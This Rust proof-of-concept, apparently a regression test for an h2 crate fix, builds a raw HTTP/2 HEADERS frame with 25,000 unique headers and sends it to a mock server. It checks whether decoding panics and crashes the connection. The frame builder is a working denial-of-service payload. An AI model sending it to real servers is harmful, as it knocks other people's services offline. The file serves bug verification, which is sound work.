// h2-2 / PR #909 (fix 4f51fff).
// A single HEADERS block carrying more than 24,576 unique header fields drives
// HeaderMap past its maximum size. At the baseline, load_hpack calls the
// panicking HeaderMap::append, so decoding this one remote HEADERS block aborts
// the connection task with a panic. The crate's 16 MiB default header-list limit
// is far too large to stop ~25,000 tiny headers first.
//
// We feed raw HPACK bytes to a server connection over the mock transport (the
// client half just writes bytes), so the headers never pass through a HeaderMap
// on our side. Exit 0 iff driving the server connection panics.
use h2_support::prelude::*;
use h2_support::prelude::futures::StreamExt;

fn build_headers_frame(num_headers: usize) -> Vec<u8> {
    // HPACK payload: three indexed pseudo-headers, :authority as a literal, then
    // `num_headers` unique "literal without indexing, new name" entries.
    let mut hpack: Vec<u8> = Vec::new();
    hpack.push(0x82); // :method GET   (static index 2)
    hpack.push(0x86); // :scheme http  (static index 6)
    hpack.push(0x84); // :path /       (static index 4)
    hpack.push(0x41); // :authority, literal w/ indexing, name index 1
    hpack.push(0x09);
    hpack.extend_from_slice(b"localhost");
    for i in 0..num_headers {
        let name = format!("x-h-{i}");
        hpack.push(0x00); // literal without indexing, new name
        hpack.push(name.len() as u8);
        hpack.extend_from_slice(name.as_bytes());
        hpack.push(1); // value length 1
        hpack.push(b'v');
    }
    let len = hpack.len();
    let mut frame = Vec::with_capacity(9 + len);
    frame.push(((len >> 16) & 0xFF) as u8);
    frame.push(((len >> 8) & 0xFF) as u8);
    frame.push((len & 0xFF) as u8);
    frame.push(0x01); // type HEADERS
    frame.push(0x05); // flags END_HEADERS | END_STREAM
    frame.extend_from_slice(&[0, 0, 0, 1]); // stream id 1
    frame.extend_from_slice(&hpack);
    frame
}

fn main() {
    let frame = build_headers_frame(25_000);

    // Silence the default panic hook's backtrace noise from the worker.
    std::panic::set_hook(Box::new(|info| {
        eprintln!("worker panicked: {}", info);
    }));

    // Run the whole exchange inside a current-thread runtime on a worker thread.
    // At the baseline, decoding the HEADERS block panics inside the server
    // connection, which unwinds block_on, so the thread join returns Err.
    let worker = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_time()
            .build()
            .unwrap();
        rt.block_on(async move {
            let (io, mut client) = mock::new();
            let peer = async move {
                client.assert_server_handshake().await;
                client.send_bytes(&frame).await;
                idle_ms(200).await;
            };
            let server = async move {
                // Allow a single large HEADERS frame so the full block reaches
                // the HPACK decoder in one frame (the panic is in HeaderMap, not
                // frame sizing). 16 MiB header-list default is unchanged.
                let mut srv = server::Builder::new()
                    .max_frame_size(1 << 20)
                    .handshake::<_, Bytes>(io)
                    .await
                    .expect("handshake");
                // Pulling the next request forces the HEADERS block to decode.
                let _ = srv.next().await;
            };
            tokio::join!(peer, server);
        });
    });

    match worker.join() {
        Err(_) => {
            println!("DEMONSTRATED: server connection panicked decoding a 25,000-header HEADERS block");
            std::process::exit(0);
        }
        Ok(()) => {
            println!("NOT demonstrated: server handled the oversized HEADERS block without panic");
            std::process::exit(1);
        }
    }
}
